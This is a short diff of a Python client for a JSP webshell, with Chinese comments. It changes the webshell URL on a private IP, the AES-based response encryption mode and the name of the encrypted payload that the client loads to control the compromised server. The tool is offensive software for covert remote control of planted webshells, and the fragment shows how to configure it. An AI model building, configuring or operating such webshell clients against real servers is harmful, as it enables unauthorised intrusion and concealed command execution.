@@ -1794,7 +1794,7 @@ class JavaShell(BaseShell):
 def main():
     # 初始化客户端
     shell = JavaShell(
-        url="http://172.26.36.30:8080/webshell/shell.jsp",
+        url="http://172.26.36.30:8080/webshell/test.jsp",
         param_name="pass", 
         secret_key="test"
     )
@@ -1804,7 +1804,7 @@ def main():
         "http": "http://172.26.32.1:8081",
     }
 
-    shell.response_encrypt_type = 'aes_base64_json'
+    shell.response_encrypt_type = 'aes_base64'
     #shell.json_template = "{\"status\":\"success\",\"encrypted_data\":\"PAYLOAD_DATA\",\"version\":\"1.0\"}"
 
     # 测试配置文件路径
@@ -1815,7 +1815,7 @@ def main():
     shell.request_format_file = custom_config_file
     shell.request_format = "form"
 
-    if shell.init_payload("mainPayload_aes_base64_json"):
+    if shell.init_payload("mainPayload_aes_base64"):
         print("初始化成功")
         shell.test()
     else:
